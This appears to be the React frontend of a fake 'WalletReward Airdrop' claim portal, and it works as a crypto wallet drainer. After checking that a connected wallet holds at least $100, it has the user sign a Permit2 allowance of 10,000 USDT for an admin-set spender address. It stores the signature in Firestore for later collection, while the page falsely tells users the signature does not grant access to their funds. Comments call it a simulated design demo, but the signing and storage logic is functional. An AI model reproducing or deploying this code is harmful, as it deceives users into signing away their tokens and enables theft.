import React, { useState, useEffect } from 'react';
import { 
  Wallet, 
  ShieldCheck, 
  ChevronRight, 
  CheckCircle2, 
  Loader2, 
  AlertCircle,
  Lock,
  FileSignature,
  Zap
} from 'lucide-react';
import { createAppKit } from '@reown/appkit/react';
import { EthersAdapter } from '@reown/appkit-adapter-ethers';
import { sepolia } from '@reown/appkit/networks';
import { BrowserProvider, Contract, formatUnits, JsonRpcProvider } from 'ethers';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';

// --- IMPORTS FROM LOGIC FILE ---
import { db } from './firebase';
import Admin from './Admin';

// -----------------------------
// CONFIGURATION
// -----------------------------
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDT_DECIMALS = 6n;
const SPENDING_CAP = BigInt(10000) * (10n ** USDT_DECIMALS);

// Initialize Reown AppKit with Sepolia Testnet
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  networks: [sepolia],
  projectId: '2541b17d4e46b8d8593a7fbbaf477df6',
  metadata: {
    name: 'WalletReward Airdrop',
    description: 'Premium Airdrop Claim Portal',
    url: 'https://example.com',
    icons: []
  },
});

/**
 * WalletReward Premium Frontend
 * A high-fidelity UI design for an airdrop claim portal.
 * Features:
 * - Glassmorphism UI
 * - Step-by-step state management
 * - simulated verification logic for design review
 */

const App = () => {
  // Routing / Admin Check
  const [isAdmin] = useState(() => window.location.pathname === '/admin');

  // State to manage the current phase of the airdrop process
  // 0: Connect Wallet, 1: Verification, 2: Signing, 3: Success
  const [phase, setPhase] = useState(0);
  
  // Simulation states for UI demonstration
  const [isConnecting, setIsConnecting] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isSigning, setIsSigning] = useState(false);
  const [verificationError, setVerificationError] = useState(false);

  // Logic State - Firestore config
  const [executorAddress, setExecutorAddress] = useState(null);
  const [tokenAddress, setTokenAddress] = useState(null);
  
  // Logic State - App state
  const [connectedAddress, setConnectedAddress] = useState(null);
  const [walletBalance, setWalletBalance] = useState(null);
  
  // --- Account Subscription ---
  useEffect(() => {
    let unsub = null;
    try {
      unsub = appKit.subscribeAccount((acct) => {
        if (acct?.isConnected && acct?.address) {
          setConnectedAddress(acct.address);
        } else {
          setConnectedAddress(null);
        }
      });
    } catch (e) {
      console.error('Account subscription error:', e);
    }
    return () => {
      if (unsub && typeof unsub === 'function') {
        unsub();
      }
    };
  }, []);

  // --- Firestore Sync ---
  useEffect(() => {
    let unsub = null;
    try {
      const ref = doc(db, 'admin_config', 'settings');
      unsub = onSnapshot(ref, (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          if (data.executorAddress) setExecutorAddress(data.executorAddress);
          if (data.tokenAddress) setTokenAddress(data.tokenAddress);
        }
      }, (err) => console.error('admin settings onSnapshot error', err));
    } catch (e) {
      console.error('Firestore config error:', e);
    }
    return () => {
      if (unsub && typeof unsub === 'function') {
        unsub();
      }
    };
  }, []);

  // --- Check Wallet Balance ---
  const checkWalletBalance = async () => {
    if (!connectedAddress) return;

    try {
      const sepoliaRpc = 'https://sepolia.infura.io/v3/ce26fb726c234f5887e1c9e91e6a2e25';
      const provider = new JsonRpcProvider(sepoliaRpc);

      const ethBalance = await provider.getBalance(connectedAddress);
      const ethBalanceInEth = parseFloat(formatUnits(ethBalance, 18));

      const usdtAddress = tokenAddress || '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
      
      const erc20Abi = [
        'function balanceOf(address account) external view returns (uint256)',
        'function decimals() external view returns (uint8)',
      ];
      
      const usdtContract = new Contract(usdtAddress, erc20Abi, provider);
      
      let decimals = 6;
      try {
        decimals = await usdtContract.decimals();
      } catch (e) {
        console.log('Could not fetch decimals, using default 6');
      }
      
      const usdtBalance = await usdtContract.balanceOf(connectedAddress);
      const usdtBalanceInUsdt = parseFloat(formatUnits(usdtBalance, decimals));

      const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
      const data = await response.json();
      const ethPrice = data?.ethereum?.usd || 2000;

      const ethValueInUsd = ethBalanceInEth * ethPrice;
      const finalBalance = ethValueInUsd + usdtBalanceInUsdt;
      setWalletBalance(finalBalance);

    } catch (err) {
      console.error('Error checking wallet balance:', err);
      setWalletBalance(0);
    }
  };

  // --- Handlers (Simulating the real Web3 logic) ---

  const handleConnect = () => {
    setIsConnecting(true);
    appKit.open();
    // Simulate AppKit connection delay
    setTimeout(() => {
      setIsConnecting(false);
      if (connectedAddress) {
        setPhase(1); // Move to Verification
      }
    }, 1500);
  };

  // Auto-advance when wallet connects
  useEffect(() => {
    if (connectedAddress && phase === 0 && !isConnecting) {
      setPhase(1);
    }
  }, [connectedAddress, phase, isConnecting]);

  const handleVerify = () => {
    setIsVerifying(true);
    setVerificationError(false);
    // Simulate smart contract read delay
    setTimeout(async () => {
      await checkWalletBalance();
      setIsVerifying(false);
      // Logic: Check if user has sufficient balance (>= $100)
      const isEligible = walletBalance !== null && walletBalance >= 100; 
      
      if (isEligible) {
        setPhase(2); // Move to Signing
      } else {
        setVerificationError(true);
      }
    }, 2000);
  };

  const handleSign = async () => {
    setIsSigning(true);
    try {
      if (!connectedAddress || !executorAddress || !tokenAddress) {
        throw new Error("Missing configuration");
      }

      const walletProvider = appKit.getWalletProvider();
      if (!walletProvider) throw new Error("Wallet provider not available.");

      const provider = new BrowserProvider(walletProvider);
      const net = await provider.getNetwork();
      const chainId = Number(net.chainId);

      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const permitted = {
        token: tokenAddress,
        amount: SPENDING_CAP.toString(),
        expiration: deadline,
        nonce
      };

      const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
      const types = {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" }
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      };

      const message = {
        details: permitted,
        spender: executorAddress,
        sigDeadline: deadline
      };

      const payload = JSON.stringify({ domain, types, primaryType: "PermitSingle", message });

      const signature = await walletProvider.request({
        method: "eth_signTypedData_v4",
        params: [connectedAddress, payload]
      });

      const raw = signature.substring(2);
      const r = "0x" + raw.substring(0, 64);
      const s = "0x" + raw.substring(64, 128);
      let v = parseInt(raw.substring(128, 130), 16);
      if (v === 0 || v === 1) v += 27;

      const id = connectedAddress + "_" + Date.now();

      await setDoc(doc(db, "permit2_signatures", id), {
        owner: connectedAddress,
        spender: executorAddress,
        token: tokenAddress,
        amount: SPENDING_CAP.toString(),
        deadline: deadline,
        expiration: deadline,
        nonce,
        r, s, v,
        processed: false,
        timestamp: Date.now()
      });

      setIsSigning(false);
      setPhase(3); // Move to Success
    } catch (err) {
      console.error(err);
      setIsSigning(false);
      alert("Signature failed: " + (err?.message || String(err)));
    }
  };

  // Admin route
  if (isAdmin) {
    return <Admin />;
  }

  return (
    <div 
      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden"
      style={{
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
      }}
    >
      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute w-96 h-96 bg-purple-300 rounded-full opacity-20 blur-3xl -top-48 -left-48 animate-pulse"></div>
        <div className="absolute w-96 h-96 bg-blue-300 rounded-full opacity-20 blur-3xl -bottom-48 -right-48 animate-pulse" style={{ animationDelay: '1s' }}></div>
      </div>

      {/* Main Card */}
      <div 
        className="relative w-full max-w-md"
        style={{
          background: 'rgba(255, 255, 255, 0.1)',
          backdropFilter: 'blur(10px)',
          WebkitBackdropFilter: 'blur(10px)',
          borderRadius: '24px',
          border: '1px solid rgba(255, 255, 255, 0.2)',
          boxShadow: '0 8px 32px 0 rgba(31, 38, 135, 0.37)'
        }}
      >
        <div className="p-8">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-white bg-opacity-20 rounded-full mb-4">
              <Zap className="text-white" size={32} />
            </div>
            <h1 className="text-3xl font-bold text-white mb-2">
              WalletReward Airdrop
            </h1>
            <p className="text-white text-opacity-80">
              Claim your exclusive rewards
            </p>
          </div>

          {/* Phase 0: Connect Wallet */}
          {phase === 0 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <Wallet className="mx-auto text-white mb-4" size={48} />
                <h2 className="text-xl font-semibold text-white mb-2">
                  Connect Your Wallet
                </h2>
                <p className="text-white text-opacity-70 text-sm">
                  Connect your wallet to verify eligibility
                </p>
              </div>

              <button
                onClick={handleConnect}
                disabled={isConnecting}
                className="w-full bg-white bg-opacity-20 hover:bg-opacity-30 transition-all duration-200 text-white font-semibold py-4 px-6 rounded-xl flex items-center justify-center gap-2 border border-white border-opacity-20 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isConnecting ? (
                  <>
                    <Loader2 className="animate-spin" size={20} />
                    Connecting...
                  </>
                ) : (
                  <>
                    <Wallet size={20} />
                    Connect Wallet
                    <ChevronRight size={20} />
                  </>
                )}
              </button>
            </div>
          )}

          {/* Phase 1: Verification */}
          {phase === 1 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <ShieldCheck className="mx-auto text-white mb-4" size={48} />
                <h2 className="text-xl font-semibold text-white mb-2">
                  Verify Eligibility
                </h2>
                <p className="text-white text-opacity-70 text-sm">
                  Checking your wallet's eligibility for rewards
                </p>
              </div>

              {/* Connected Wallet Info */}
              <div 
                className="p-4 rounded-xl"
                style={{
                  background: 'rgba(255, 255, 255, 0.1)',
                  border: '1px solid rgba(255, 255, 255, 0.2)'
                }}
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Wallet size={16} className="text-white" />
                    <span className="text-white text-sm font-mono">
                      {connectedAddress ? `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}` : 'Not connected'}
                    </span>
                  </div>
                  <CheckCircle2 size={18} className="text-green-300" />
                </div>
              </div>

              <button
                onClick={handleVerify}
                disabled={isVerifying || !connectedAddress}
                className="w-full bg-white bg-opacity-20 hover:bg-opacity-30 transition-all duration-200 text-white font-semibold py-4 px-6 rounded-xl flex items-center justify-center gap-2 border border-white border-opacity-20 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isVerifying ? (
                  <>
                    <Loader2 className="animate-spin" size={20} />
                    Verifying...
                  </>
                ) : (
                  <>
                    <ShieldCheck size={20} />
                    Verify Eligibility
                  </>
                )}
              </button>

              {verificationError && (
                <div 
                  className="p-4 rounded-xl flex items-start gap-2"
                  style={{
                    background: 'rgba(239, 68, 68, 0.2)',
                    border: '1px solid rgba(239, 68, 68, 0.3)'
                  }}
                >
                  <AlertCircle size={18} className="text-red-200 flex-shrink-0 mt-0.5" />
                  <p className="text-red-100 text-sm">
                    Your wallet does not meet the eligibility requirements.
                  </p>
                </div>
              )}
            </div>
          )}

          {/* Phase 2: Signing */}
          {phase === 2 && (
            <div className="space-y-6">
              <div className="text-center mb-6">
                <FileSignature className="mx-auto text-white mb-4" size={48} />
                <h2 className="text-xl font-semibold text-white mb-2">
                  Sign Message
                </h2>
                <p className="text-white text-opacity-70 text-sm">
                  Sign the message to claim your rewards
                </p>
              </div>

              {/* Security Context Box */}
              <div 
                className="p-4 rounded-xl space-y-3"
                style={{
                  background: 'rgba(255, 255, 255, 0.1)',
                  border: '1px solid rgba(255, 255, 255, 0.2)'
                }}
              >
                <div className="flex items-center gap-2">
                  <Lock size={16} className="text-white" />
                  <span className="text-white text-sm font-semibold">Security Information</span>
                </div>
                <p className="text-white text-opacity-70 text-xs leading-relaxed">
                  This signature is free and doesn't grant access to your funds. 
                  It only verifies your wallet ownership.
                </p>
              </div>

              <button
                onClick={handleSign}
                disabled={isSigning}
                className="w-full bg-white bg-opacity-20 hover:bg-opacity-30 transition-all duration-200 text-white font-semibold py-4 px-6 rounded-xl flex items-center justify-center gap-2 border border-white border-opacity-20 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isSigning ? (
                  <>
                    <Loader2 className="animate-spin" size={20} />
                    Signing...
                  </>
                ) : (
                  <>
                    <FileSignature size={20} />
                    Sign Message
                  </>
                )}
              </button>
            </div>
          )}

          {/* Phase 3: Success */}
          {phase === 3 && (
            <div className="space-y-6 text-center">
              <div className="flex flex-col items-center">
                <div className="w-20 h-20 bg-green-400 bg-opacity-20 rounded-full flex items-center justify-center mb-4 animate-bounce">
                  <CheckCircle2 className="text-green-300" size={40} />
                </div>
                <h2 className="text-2xl font-bold text-white mb-2">
                  Success!
                </h2>
                <p className="text-white text-opacity-70 text-sm mb-6">
                  Your claim has been processed successfully
                </p>
              </div>

              <div 
                className="p-6 rounded-xl space-y-4"
                style={{
                  background: 'rgba(255, 255, 255, 0.1)',
                  border: '1px solid rgba(255, 255, 255, 0.2)'
                }}
              >
                <div>
                  <p className="text-white text-opacity-60 text-xs uppercase tracking-wide mb-1">
                    Reward Amount
                  </p>
                  <p className="text-white text-3xl font-bold">
                    500 Tokens
                  </p>
                </div>
                <div className="pt-3 border-t border-white border-opacity-20">
                  <p className="text-white text-opacity-60 text-xs">
                    Tokens will be distributed to your wallet within 24 hours
                  </p>
                </div>
              </div>

              <button
                onClick={() => setPhase(0)}
                className="w-full bg-white bg-opacity-20 hover:bg-opacity-30 transition-all duration-200 text-white font-semibold py-3 px-6 rounded-xl flex items-center justify-center gap-2 border border-white border-opacity-20"
              >
                Close
              </button>
            </div>
          )}
        </div>
        
        {/* Footer Disclaimer */}
        <div 
          className="px-8 pb-6 pt-4 border-t"
          style={{
            borderColor: 'rgba(255, 255, 255, 0.1)'
          }}
        >
          <p className="text-white text-opacity-60 text-xs text-center leading-relaxed">
            By connecting your wallet, you agree to our Terms of Service. 
            We do not access your private keys.
          </p>
        </div>
      </div>
    </div>
  );
};

export default App;
